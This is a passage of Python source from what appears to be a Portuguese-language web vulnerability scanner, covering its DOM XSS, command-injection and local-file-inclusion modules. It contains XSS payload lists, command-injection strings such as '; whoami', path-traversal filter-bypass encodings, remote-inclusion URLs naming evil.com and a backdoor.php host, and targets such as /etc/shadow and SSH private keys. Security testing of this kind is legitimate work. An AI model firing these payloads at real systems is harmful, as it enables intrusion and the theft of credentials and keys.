        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        # Coleta de tarefas (pontos de entrada)
        tasks = []
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query): tasks.append(('get', base, param, None))

        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea'], {'name': True})}
            for param in data: tasks.append((method, action, param, data))
        
        if not tasks and not forms and not self.fuzz_dom:
            if not return_findings: console.print("[yellow]Nenhum ponto de entrada (parâmetro ou formulário) encontrado para testar XSS.[/yellow]")
            return [] if return_findings else None
        
        # Se não há pontos de entrada tradicionais mas DOM XSS está ativado, continua
        if not tasks and not forms and self.fuzz_dom:
            if not return_findings: console.print("[yellow]Nenhum ponto de entrada tradicional encontrado. Executando apenas DOM XSS.[/yellow]")
        
        # Execução dos scans (apenas se houver pontos de entrada tradicionais)
        if tasks or forms:
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=return_findings) as progress:
                # 1. Scan de XSS Refletido
                if tasks:
                    self._scan_reflected(tasks, progress)

                # 2. Scan de XSS Armazenado (se ativado)
                if self.scan_stored and forms:
                    post_forms = [form for form in forms if form.get('method', 'get').lower() == 'post']
                    if post_forms:
                        self._inject_into_forms(post_forms, progress)
                        self._verify_storage(progress)
        
        # DOM XSS scanning
        if self.fuzz_dom:
            try:
                dom_scanner = DOMXSSScanner(self.base_url, verbose=self.verbose)
                dom_vulnerabilities = dom_scanner.scan()
                
                # Adiciona vulnerabilidades DOM XSS aos resultados principais
                self.vulnerable_points.extend(dom_vulnerabilities)
                
                if self.verbose:
                    console.print(f"[+] DOM XSS scan concluído: {len(dom_vulnerabilities)} vulnerabilidades encontradas")
                    
            except Exception as e:
                console.print(f"[red]Erro durante scan DOM XSS: {e}[/red]")
                if self.verbose:
                    console.print("[yellow]Dica: Certifique-se de que o Selenium e um WebDriver (Chrome/Firefox) estão instalados[/yellow]")

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        """Apresenta os resultados do scan de XSS."""
        console.print("-" * 60)
        if not self.vulnerable_points:
            console.print("[bold green][+] Nenhuma vulnerabilidade de XSS foi encontrada.[/bold green]")
        else:
            table = Table(title="Potenciais Vulnerabilidades de XSS Encontradas")
            table.add_column("Risco", style="cyan")
            table.add_column("Tipo", style="yellow")
            table.add_column("Detalhe", style="magenta")
            table.add_column("Recomendação", style="white")
            
            risk_order = {"Alto": 0, "Médio": 1, "Baixo": 2}
            sorted_findings = sorted(self.vulnerable_points, key=lambda x: risk_order.get(x["Risco"], 99))

            for f in sorted_findings:
                risk_style = "red" if f['Risco'] == 'Alto' else "yellow"
                table.add_row(f"[{risk_style}]{f['Risco']}[/{risk_style}]", f['Tipo'], f['Detalhe'], f['Recomendação'])
            console.print(table)
        console.print("-" * 60)

# --- CLASSE DOM XSS SCANNER ---

class DOMXSSScanner:
    def __init__(self, base_url, verbose=False):
        self.base_url = base_url
        self.verbose = verbose
        self.driver = None
        self.vulnerable_points = []
        
        # DOM XSS sources (fontes de dados)
        self.dom_sources = [
            'document.URL',
            'document.documentURI', 
            'document.baseURI',
            'location.href',
            'location.search',
            'location.pathname',
            'location.hash',
            'document.referrer',
            'window.name',
            'history.pushState',
            'history.replaceState',
            'localStorage',
            'sessionStorage',
            'document.cookie',
            'postMessage'
        ]
        
        # DOM XSS sinks (pontos de execução)
        self.dom_sinks = [
            'eval()',
            'Function()',
            'setTimeout()',
            'setInterval()',
            'document.write()',
            'document.writeln()',
            'innerHTML',
            'outerHTML',
            'document.createElement',
            'insertAdjacentHTML',
            'location.href',
            'location.replace()',
            'location.assign()',
            'open()',
            'showModalDialog()',
            'execScript()',
            'crypto.generateCRMFRequest()',
            'ScriptElement.src',
            'ScriptElement.text',
            'ScriptElement.textContent',
            'ScriptElement.innerText'
        ]
        
        # Payloads específicos para DOM XSS
        self.dom_payloads = self._get_dom_payloads()
    
    def _get_dom_payloads(self):
        """Retorna payloads específicos para DOM-based XSS."""
        return [
            # Hash-based XSS (Google XSS Game Level 3 specific)
            "#1<script>alert('dom-xss-level3')</script>",
            "#2<img src=x onerror=alert('dom-xss-level3')>",
            "#3<svg onload=alert('dom-xss-level3')>",
            "#1'<script>alert('dom-xss-level3')</script>",
            "#1\"<script>alert('dom-xss-level3')</script>",
            "#1 onerror=alert('dom-xss-level3') src=x",
            "#1'><img src=x onerror=alert('dom-xss-level3')>",
            "#1\"><img src=x onerror=alert('dom-xss-level3')>",
            
            # Generic Hash-based XSS
            "#<script>alert('dom-xss-hash')</script>",
            "#<img src=x onerror=alert('dom-xss-hash')>",
            "#javascript:alert('dom-xss-hash')",
            
            # URL fragment XSS  
            "#<svg onload=alert('dom-xss-fragment')>",
            "#<iframe src=javascript:alert('dom-xss-fragment')>",
            
            # PostMessage XSS
            "<script>window.postMessage('<img src=x onerror=alert(\"dom-xss-postmessage\")>','*')</script>",
            
            # Location-based XSS
            "javascript:alert('dom-xss-location')",
            "data:text/html,<script>alert('dom-xss-data')</script>",
            
            # DOM manipulation XSS
            "<script>document.body.innerHTML='<img src=x onerror=alert(\"dom-xss-inner\")'</script>",
            "<script>document.write('<img src=x onerror=alert(\"dom-xss-write\")')</script>",
            
            # Event-based DOM XSS
            "#<body onload=alert('dom-xss-event')>",
            "#<div onclick=alert('dom-xss-click')>Click</div>",
            
            # Angular/React specific
            "{{constructor.constructor('alert(\"dom-xss-angular\")')()}}",
            "${alert('dom-xss-template')}",
            
            # Advanced DOM XSS
            "#<script>eval('ale'+'rt(\"dom-xss-eval\")')</script>",
            "#<script>Function('ale'+'rt(\"dom-xss-function\")')();</script>",
            "#<script>setTimeout('alert(\"dom-xss-timeout\")',0)</script>",
            
            # JSON-based DOM XSS  
            '{"xss":"<img src=x onerror=alert(\'dom-xss-json\')>"}',
            
            # URL parameter manipulation
            "?xss=<script>alert('dom-xss-param')</script>",
            "&payload=<img src=x onerror=alert('dom-xss-param2')>",
            
            # Document.cookie XSS
            "<script>document.cookie='xss=<img src=x onerror=alert(\"dom-xss-cookie\")>'</script>",
            
            # LocalStorage XSS  
            "<script>localStorage.setItem('xss','<img src=x onerror=alert(\"dom-xss-storage\")')</script>",
            
            # History API XSS
            "<script>history.pushState(null,null,'#<img src=x onerror=alert(\"dom-xss-history\")')</script>"
        ]
    
    def _setup_driver(self):
        """Configura o WebDriver (Chrome/Firefox headless)."""
        if not SELENIUM_AVAILABLE:
            raise Exception("Selenium não está instalado. Execute: pip install selenium")
        
        try:
            # Tenta Chrome primeiro
            chrome_options = ChromeOptions()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            self.driver = webdriver.Chrome(options=chrome_options)
            if self.verbose:
                console.print("[+] WebDriver Chrome configurado com sucesso")
            return True
            
        except WebDriverException:
            try:
                # Fallback para Firefox
                firefox_options = FirefoxOptions()
                firefox_options.add_argument('--headless')
                firefox_options.add_argument('--width=1920')
                firefox_options.add_argument('--height=1080')
                
                self.driver = webdriver.Firefox(options=firefox_options)
                if self.verbose:
                    console.print("[+] WebDriver Firefox configurado com sucesso")
                return True
                
            except WebDriverException as e:
                if self.verbose:
                    console.print(f"[red]Erro ao configurar WebDriver: {e}[/red]")
                return False
    
    def _inject_dom_payload(self, url, payload):
        """Injeta payload DOM XSS na URL."""
        try:
            # Para payloads que começam com #, adiciona ao final da URL
            if payload.startswith('#'):
                test_url = url + payload
            # Para payloads de parâmetro, adiciona como query string
            elif payload.startswith('?') or payload.startswith('&'):
                separator = '&' if '?' in url else '?'
                test_url = url + separator + payload.lstrip('?&')
            # Para outros payloads, tenta diferentes abordagens
            else:
                test_url = url + '#' + payload
            
            self.driver.get(test_url)
            WebDriverWait(self.driver, 3).until(lambda d: d.execute_script("return document.readyState") == "complete")
            
            return test_url
            
        except TimeoutException:
            return url
        except Exception:
            return None
    
    def _detect_dom_xss_execution(self, payload):
        """Detecta se o DOM XSS foi executado."""
        try:
            # Reset do estado de alert antes de cada teste
            self.driver.execute_script("window.alertTriggered = false; window.lastAlertMessage = '';")
            
            # Pequena pausa para permitir execução
            import time
            time.sleep(2)
            
            # Verifica se alert foi chamado
            alert_triggered = self.driver.execute_script("return window.alertTriggered === true;")
            last_alert = self.driver.execute_script("return window.lastAlertMessage || '';")
            
            # Verifica mudanças no DOM relacionadas ao payload
            payload_indicators = ['dom-xss', 'level3', 'xss-test']
            dom_contains_indicators = self.driver.execute_script(f"""
                var content = document.documentElement.innerHTML.toLowerCase();
                var indicators = {payload_indicators};
                return indicators.some(function(indicator) {{
                    return content.includes(indicator);
                }});
            """)
            
            # Verifica console errors que indicam execução
            try:
                console_errors = self.driver.get_log('browser')
                script_errors = [log for log in console_errors if any(indicator in log.get('message', '').lower() for indicator in payload_indicators)]
            except:
                console_errors = []
                script_errors = []
            
            # Verifica se o payload está presente no DOM
            payload_in_dom = False
            try:
                clean_payload = payload.replace("'", "\\'").replace('"', '\\"')
                payload_in_dom = self.driver.execute_script(f"""
                    return document.documentElement.innerHTML.includes('{clean_payload}');
                """)
            except:
                pass
            
            # Execução detectada se:
            # 1. Alert foi chamado
            # 2. DOM contém indicadores dos nossos payloads
            # 3. Há erros de script relacionados
            executed = alert_triggered or dom_contains_indicators or len(script_errors) > 0
            
            return {
                'executed': executed,
                'alert_triggered': alert_triggered,
                'last_alert_message': last_alert,
                'dom_contains_indicators': dom_contains_indicators,
                'console_errors': script_errors,
                'payload_in_dom': payload_in_dom,
                'current_url': self.driver.current_url,
                'page_title': self.driver.title
            }
            
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Erro na detecção DOM XSS: {e}[/yellow]")
            return {'executed': False, 'error': str(e)}
    
    def _analyze_javascript_sources_sinks(self):
        """Analisa sources e sinks de JavaScript na página."""
        try:
            # Analisa scripts inline
            scripts = self.driver.find_elements(By.TAG_NAME, "script")
            sources_found = []
            sinks_found = []
            
            for script in scripts:
                script_content = script.get_attribute('innerHTML')
                if script_content:
                    # Verifica sources
                    for source in self.dom_sources:
                        if source in script_content:
                            sources_found.append(source)
                    
                    # Verifica sinks  
                    for sink in self.dom_sinks:
                        if sink in script_content:
                            sinks_found.append(sink)
            
            # Analisa event handlers
            event_handlers = self.driver.execute_script("""
                var handlers = [];
                var elements = document.querySelectorAll('*');
                for (var i = 0; i < elements.length; i++) {
                    var attrs = elements[i].attributes;
                    for (var j = 0; j < attrs.length; j++) {
                        if (attrs[j].name.startsWith('on')) {
                            handlers.push({
                                element: elements[i].tagName,
                                event: attrs[j].name,
                                code: attrs[j].value
                            });
                        }
                    }
                }
                return handlers;
            """)
            
            return {
                'sources': list(set(sources_found)),
                'sinks': list(set(sinks_found)),
                'event_handlers': event_handlers
            }
            
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Erro na análise de sources/sinks: {e}[/yellow]")
            return {'sources': [], 'sinks': [], 'event_handlers': []}
    
    def scan(self):
        """Executa o scan de DOM XSS."""
        if not SELENIUM_AVAILABLE:
            console.print("[red]Selenium não está disponível. Execute: pip install selenium[/red]")
            return []
        
        if not self._setup_driver():
            console.print("[red]Não foi possível configurar o WebDriver[/red]")
            return []
        
        console.print(f"[*] Iniciando scan DOM XSS em: [cyan]{self.base_url}[/cyan]")
        
        try:
            # Carrega a página inicial
            self.driver.get(self.base_url)
            WebDriverWait(self.driver, 10).until(lambda d: d.execute_script("return document.readyState") == "complete")
            
            # Configura override do alert globalmente
            self.driver.execute_script("""
                window.originalAlert = window.alert;
                window.alertTriggered = false;
                window.lastAlertMessage = '';
                window.alert = function(msg) {
                    window.alertTriggered = true;
                    window.lastAlertMessage = msg;
                    console.log('SPECTRA-ALERT-DETECTED:', msg);
                    return true;
                };
            """)
            
            # Analisa sources e sinks
            js_analysis = self._analyze_javascript_sources_sinks()
            
            if self.verbose and (js_analysis['sources'] or js_analysis['sinks']):
                console.print(f"[+] Sources encontrados: {', '.join(js_analysis['sources'])}")
                console.print(f"[+] Sinks encontrados: {', '.join(js_analysis['sinks'])}")
            
            # Testa payloads DOM XSS
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TimeRemainingColumn(),
                console=console
            ) as progress:
                task = progress.add_task("[green]Testando DOM XSS...", total=len(self.dom_payloads))
                
                for payload in self.dom_payloads:
                    progress.update(task, advance=1, description=f"[green]Testando: [cyan]{payload[:50]}...[/cyan]")
                    
                    # Injeta payload
                    test_url = self._inject_dom_payload(self.base_url, payload)
                    if not test_url:
                        continue
                    
                    # Detecta execução
                    result = self._detect_dom_xss_execution(payload)
                    
                    if result.get('executed'):
                        # Detalhes da execução
                        execution_details = []
                        if result.get('alert_triggered'):
                            execution_details.append(f"Alert chamado: '{result.get('last_alert_message', '')}'")
                        if result.get('dom_contains_indicators'):
                            execution_details.append("Indicadores encontrados no DOM")
                        if result.get('console_errors'):
                            execution_details.append(f"{len(result.get('console_errors', []))} erros de script")
                        
                        detail_text = f"Payload: {payload}"
                        if execution_details:
                            detail_text += f" | Execução: {' + '.join(execution_details)}"
                        
                        vulnerability = {
                            'Risco': 'Alto',
                            'Tipo': 'DOM-based XSS',
                            'Detalhe': detail_text,
                            'URL': test_url,
                            'Recomendação': f"Sanitizar fontes DOM (location.hash, etc.) e validar sinks. Sources: {', '.join(js_analysis.get('sources', []))}. Sinks: {', '.join(js_analysis.get('sinks', []))}"
                        }
                        self.vulnerable_points.append(vulnerability)
                        
                        if self.verbose:
                            console.print(f"[red]✗ DOM XSS encontrado: {payload}[/red]")
                            console.print(f"    [yellow]URL: {test_url}[/yellow]")
                            if result.get('alert_triggered'):
                                console.print(f"    [green]✓ Alert executado: '{result.get('last_alert_message', '')}'[/green]")
                            if result.get('dom_contains_indicators'):
                                console.print(f"    [green]✓ Payload detectado no DOM[/green]")
                            
        except Exception as e:
            console.print(f"[red]Erro durante scan DOM XSS: {e}[/red]")
            
        finally:
            if self.driver:
                self.driver.quit()
        
        return self.vulnerable_points

def xss_scan(url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False, enable_bypasses=True, context_analysis=True, validate_execution=True, analyze_csp=True, verbose=False):
    scanner = XSSScanner(url, custom_payloads_file=custom_payloads_file, scan_stored=scan_stored, fuzz_dom=fuzz_dom)
    scanner.enable_bypasses = enable_bypasses
    scanner.context_analysis = context_analysis  
    scanner.validate_execution = validate_execution
    scanner.analyze_csp = analyze_csp
    scanner.verbose = verbose
    scanner.run_scan()

# --- MÓDULO 16: SCANNER DE INJEÇÃO DE COMANDOS ---

class CommandInjectionScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.vulnerable_points = []
        self.payloads = ["; whoami", "&& whoami", "| whoami", "; dir", "&& dir", "| dir"]

    def _scan_target(self, url, method, param, form_data=None):
        for payload in self.payloads:
            try:
                test_data = {param: payload}
                if method.lower() == 'get': response = self.session.get(url, params=test_data, timeout=7, verify=False)
                else:
                    post_payload = form_data.copy()
                    post_payload[param] = payload
                    response = self.session.post(url, data=post_payload, timeout=7, verify=False)
                
                if re.search(r'root|nt authority|system|\<dir\>', response.text, re.I) or 'total' in response.text:
                    finding = {"Risco": "Crítico", "Tipo": "Injeção de Comandos", "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})", "Recomendação": f"Payload '{payload}' parece ter sido executado. Investigação manual urgente."}
                    if finding not in self.vulnerable_points: self.vulnerable_points.append(finding)
                    return
            except requests.RequestException: pass

    def run_scan(self, return_findings=False):
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando scanner de Injeção de Comandos em: [bold cyan]{self.base_url}[/bold cyan]")
            console.print("-" * 60)
        try:
            with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        tasks = []
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query): tasks.append(('get', base, param, None))

        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in data: tasks.append((method, action, param, data))
        
        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum ponto de entrada encontrado para testar Injeção de Comandos.[/yellow]")
            return [] if return_findings else None

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
            task_id = progress.add_task("[green]Testando Injeção de Comandos...", total=len(tasks))
            for method, url, param, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        console.print("-" * 60)
        if not self.vulnerable_points:
            console.print("[bold green][+] Nenhuma vulnerabilidade de Injeção de Comandos foi encontrada.[/bold green]")
        else:
            table = Table(title="Potenciais Vulnerabilidades de Injeção de Comandos Encontradas")
            table.add_column("Detalhe", style="cyan")
            table.add_column("Recomendação", style="white")
            for f in self.vulnerable_points: table.add_row(f['Detalhe'], f['Recomendação'])
            console.print(table)
        console.print("-" * 60)

def command_injection_scan(url):
    CommandInjectionScanner(url).run_scan()

# --- MÓDULO 17: SCANNER DE LFI (LOCAL FILE INCLUSION) ---

class LFIScanner:
    def __init__(self, base_url, timeout=10, threads=5):
        self.base_url = base_url
        self.timeout = timeout
        self.threads = threads
        self.verbose = False
        self.fast_mode = False
        self.found_vulnerabilities = []
        self.stop_on_first = False
        
        # Session pool para melhor performance
        self.session_pool = []
        for _ in range(min(threads, 10)):  # Máximo 10 sessões
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            })
            # Configurar pool de conexões
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=10,
                pool_maxsize=20,
                max_retries=1
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            self.session_pool.append(session)
            
        self.current_session_index = 0
        self.vulnerable_points = []
        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/test",
            "ftp://malicious.com/backdoor.php"
        ]
        self.payloads = {
            # Linux/Unix files
            "/etc/passwd": ["root:x:0:0", "daemon:x:1:1", "bin:x:2:2"],
            "/etc/shadow": ["root:$", "daemon:*:", "bin:*:"],
            "/etc/hosts": ["127.0.0.1", "localhost"],
            "/etc/group": ["root:x:0:", "daemon:x:1:"],
            "/etc/issue": ["Ubuntu", "Debian", "CentOS", "Red Hat"],
            "/etc/motd": ["Welcome", "Last login"],
            "/etc/fstab": ["proc", "sysfs", "devpts"],
            "/etc/crontab": ["SHELL=/bin/bash", "PATH=/usr/local/sbin"],
            "/etc/apache2/apache2.conf": ["ServerRoot", "Listen"],
            "/etc/nginx/nginx.conf": ["worker_processes", "http {"],
            "/var/log/apache2/access.log": ["GET", "POST", "200", "404"],
            "/var/log/nginx/access.log": ["GET", "POST", "200", "404"],
            "/proc/version": ["Linux version", "gcc version"],
            "/proc/cpuinfo": ["processor", "model name"],
            "/proc/meminfo": ["MemTotal", "MemFree"],
            "/proc/self/environ": ["PATH=", "HOME="],
            "/proc/cmdline": ["BOOT_IMAGE", "root="],
            "/proc/mounts": ["rootfs", "proc", "sysfs"],
            "/proc/net/arp": ["IP address", "HW type"],
            "/proc/net/route": ["Iface", "Destination"],
            "/proc/net/tcp": ["sl", "local_address"],
            "/proc/net/udp": ["sl", "local_address"],
            "/proc/net/fib_trie": ["Local", "Main"],
            "/proc/self/status": ["Name:", "Pid:"],
            "/proc/self/cmdline": ["python", "apache", "nginx"],
            "/proc/self/stat": ["(", ")"],
            "/proc/self/fd/0": ["/dev/pts", "socket"],
            "/proc/self/fd/1": ["/dev/pts", "socket"],
            "/proc/self/fd/2": ["/dev/pts", "socket"],
            "/home/user/.bashrc": ["alias", "export"],
            "/home/user/.bash_history": ["sudo", "ssh", "mysql"],
            "/root/.bashrc": ["alias", "export"],
            "/root/.bash_history": ["sudo", "ssh", "mysql"],
            "/root/.ssh/id_rsa": ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"],
            "/root/.ssh/id_dsa": ["BEGIN DSA PRIVATE KEY"],
            "/root/.ssh/authorized_keys": ["ssh-rsa", "ssh-dss"],
            "/home/user/.ssh/id_rsa": ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"],
            "/home/user/.ssh/authorized_keys": ["ssh-rsa", "ssh-dss"],
            
            # Windows files
            "c:\\boot.ini": ["[boot loader]", "timeout=", "default="],
            "c:\\windows\\system32\\drivers\\etc\\hosts": ["127.0.0.1", "localhost"],
            "c:\\windows\\system32\\config\\sam": ["SAM", "SECURITY"],
            "c:\\windows\\system32\\config\\system": ["SYSTEM", "ControlSet"],
            "c:\\windows\\system32\\config\\security": ["SECURITY", "Policy"],
            "c:\\windows\\system32\\config\\software": ["SOFTWARE", "Microsoft"],
            "c:\\windows\\win.ini": ["[fonts]", "[extensions]"],
            "c:\\windows\\system.ini": ["[386Enh]", "[drivers]"],
            "c:\\autoexec.bat": ["@echo off", "PATH"],
            "c:\\config.sys": ["DOS=HIGH", "DEVICE="],
            "c:\\inetpub\\wwwroot\\web.config": ["<configuration>", "<system.web>"],
            "c:\\program files\\apache group\\apache\\conf\\httpd.conf": ["ServerRoot", "Listen"],
            "c:\\xampp\\apache\\conf\\httpd.conf": ["ServerRoot", "Listen"],
            "c:\\wamp\\bin\\apache\\apache2.4.9\\conf\\httpd.conf": ["ServerRoot", "Listen"],
            "c:\\apache\\conf\\httpd.conf": ["ServerRoot", "Listen"],
            "c:\\apache2\\conf\\httpd.conf": ["ServerRoot", "Listen"],
            "c:\\php\\php.ini": ["[PHP]", "extension_dir"],
            "c:\\windows\\php.ini": ["[PHP]", "extension_dir"],
            "c:\\winnt\\php.ini": ["[PHP]", "extension_dir"],
            "c:\\users\\administrator\\ntuser.dat": ["RegEdit", "Registry"],
            "c:\\documents and settings\\administrator\\ntuser.dat": ["RegEdit", "Registry"],
            "c:\\windows\\repair\\sam": ["SAM", "SECURITY"],
            "c:\\windows\\repair\\system": ["SYSTEM", "ControlSet"],
            "c:\\windows\\temp\\": ["tmp", "temp"],
            "c:\\temp\\": ["tmp", "temp"],
            "c:\\inetpub\\logs\\logfiles\\w3svc1\\ex": ["date", "time", "GET", "POST"],
            "c:\\windows\\system32\\logfiles\\httperr\\httperr1.log": ["Date", "Time", "GET", "POST"],
            
            # Mac OS files
            "/etc/master.passwd": ["root:", "daemon:"],
            "/etc/passwd": ["root:*:0:0", "daemon:*:1:1"],
            "/etc/group": ["wheel:*:0:", "daemon:*:1:"],
            "/etc/hosts": ["127.0.0.1", "localhost"],
            "/etc/resolv.conf": ["nameserver", "domain"],
            "/var/log/system.log": ["kernel", "launchd"],
            "/private/etc/passwd": ["root:*:0:0", "daemon:*:1:1"],
            "/private/etc/master.passwd": ["root:", "daemon:"],
            "/users/administrator/.bash_history": ["sudo", "ssh", "mysql"],
            "/users/administrator/.bashrc": ["alias", "export"],
            "/system/library/launchdaemons/": ["plist", "daemon"],
            "/library/preferences/": ["plist", "preferences"],
            "/applications/": ["app", "Applications"],
            "/private/var/log/": ["log", "system"],
            "/usr/local/bin/": ["bin", "usr"],
            "/opt/local/bin/": ["bin", "opt"],
            "/private/etc/apache2/httpd.conf": ["ServerRoot", "Listen"],
            "/private/etc/nginx/nginx.conf": ["worker_processes", "http {"],
            "/library/webserver/documents/": ["index", "html"],
            "/usr/local/mysql/data/": ["mysql", "data"],
            "/private/var/mysql/": ["mysql", "data"],
            "/private/etc/my.cnf": ["[mysqld]", "datadir"],
            "/usr/local/etc/my.cnf": ["[mysqld]", "datadir"],
            "/opt/local/etc/mysql5/my.cnf": ["[mysqld]", "datadir"]
        }

    def _get_session(self):
        """Obtém uma sessão do pool de forma round-robin"""
        session = self.session_pool[self.current_session_index]
        self.current_session_index = (self.current_session_index + 1) % len(self.session_pool)
        return session

    def _apply_encoding_techniques(self, payload):
        """Aplica diferentes técnicas de codificação para bypass de filtros"""
        if self.fast_mode:
            # Modo rápido: apenas as técnicas mais eficazes
            techniques = [
                payload,  # Original
                payload.replace('/', '%2f'),  # URL encoding
                payload.replace('/', '%252f'),  # Double URL encoding
                payload.replace('../', '..\\'),  # Windows path separator
                payload + '%00',  # Null byte termination
                payload.replace('../', '..%2f'),  # Mixed encoding
                payload.replace('../', '..%2e%2e%2f'),  # Full dot encoding
                payload.replace('../', '..%c0%af'),  # UTF-8 encoded slash
                payload.replace('../', '..%00/'),  # Null byte bypass
                payload.replace('../', '....//'),  # Double dot slash
            ]
        else:
            # Modo completo: todas as técnicas
            techniques = [
                payload,  # Original
                payload.replace('/', '%2f'),  # URL encoding
                payload.replace('/', '%252f'),  # Double URL encoding
                payload.replace('/', '%c0%af'),  # UTF-8 encoding
                payload.replace('/', '%c1%9c'),  # UTF-8 overlong encoding
                payload + '%00',  # Null byte termination
                payload.replace('../', '..\\'),  # Windows path separator
                payload.replace('../', '....//'),  # Double dot slash
                payload.replace('../', '..%2f'),  # Mixed encoding
                payload.replace('../', '..%252f'),  # Double encoded slash
                payload.replace('../', '..%c0%af'),  # UTF-8 encoded slash
                payload.replace('../', '..%5c'),  # Backslash encoding
                payload.replace('../', '..\\..\\'),  # Mixed separators
                payload.replace('/', '\\'),  # Full backslash
                payload + '?',  # Query string bypass
                payload + '#',  # Fragment bypass
                payload + '/./',  # Current directory bypass
                payload + '//',  # Double slash
                payload.replace('/', '/./'),  # Current directory injection
                payload.replace('/', '//'),  # Double slash injection
                payload.replace('../', '..;/'),  # Semicolon bypass
                payload.replace('../', '..%00/'),  # Null byte bypass
                payload.replace('../', '..%0d%0a/'),  # CRLF bypass
                payload.replace('../', '..%09/'),  # Tab bypass
                payload.replace('../', '..%20/'),  # Space bypass
                payload.replace('../', '..%2e%2e%2f'),  # Full dot encoding
                payload.replace('../', '%2e%2e%2f'),  # Dot encoding
                payload.replace('../', '%2e%2e/'),  # Mixed dot encoding
                payload.replace('../', '..%2f%2e%2e%2f'),  # Complex encoding
                payload.replace('../', '..\\..\\'),  # Windows double backslash
                payload.replace('../', '..%5c..%5c'),  # Encoded backslash
                payload + '\\x00',  # Null byte (hex)
                payload.replace('/', '%2F'),  # Capital URL encoding
                payload.replace('../', '..%2F'),  # Mixed case encoding
                payload.replace('../', '..%2f%2e%2e%2f'),  # Complex lowercase
                payload.replace('../', '..%2F%2E%2E%2F'),  # Complex uppercase
                payload.replace('../', '....%2f%2f'),  # Quadruple dot
                payload.replace('../', '....\\\\'),  # Quadruple backslash
                payload.replace('../', '..%u002f'),  # Unicode encoding
                payload.replace('../', '..%u005c'),  # Unicode backslash
                payload.replace('../', '..\\u002f'),  # Mixed unicode
                payload.replace('../', '..\\u005c'),  # Mixed unicode backslash
                payload.replace('../', '..%c0%2f'),  # Overlong UTF-8
                payload.replace('../', '..%e0%80%af'),  # Overlong UTF-8 variant
                payload.replace('../', '..%f0%80%80%af'),  # Overlong UTF-8 variant 2
                payload.replace('../', '..%c0%ae%c0%ae%c0%af'),  # Multiple overlong
                payload.replace('../', '..%c0%ae%c0%ae/'),  # Mixed overlong
                payload.replace('../', '..%c0%ae%c0%ae%2f'),  # Mixed overlong encoded
                payload.replace('../', '..%c0%ae%c0%ae%5c'),  # Mixed overlong backslash
                payload.replace('../', '..%c0%ae%c0%ae\\'),  # Mixed overlong literal
                payload.replace('../', '..%c0%ae\\%c0%ae\\'),  # Complex overlong
                payload.replace('../', '..%c0%ae%2f%c0%ae%2f'),  # Complex overlong slash
                payload.replace('../', '..%c0%ae%5c%c0%ae%5c'),  # Complex overlong backslash
                payload.replace('../', '..%c0%ae../'),  # Mixed overlong traversal
                payload.replace('../', '..%c0%ae\\..\\'),  # Mixed overlong windows
                payload + '\\x00\\x00',  # Double null byte
                payload + '\\x00\\x00\\x00',  # Triple null byte
                payload + '%00%00',  # Double encoded null
                payload + '%00%00%00',  # Triple encoded null
                payload + '\\0',  # String null terminator
                payload + '\\0\\0',  # Double string null
            ]
        
        # Remove duplicatas mantendo ordem
        seen = set()
        unique_techniques = []
        for tech in techniques:
            if tech not in seen:
                seen.add(tech)
                unique_techniques.append(tech)
        
        return unique_techniques

    def _test_payload(self, args):
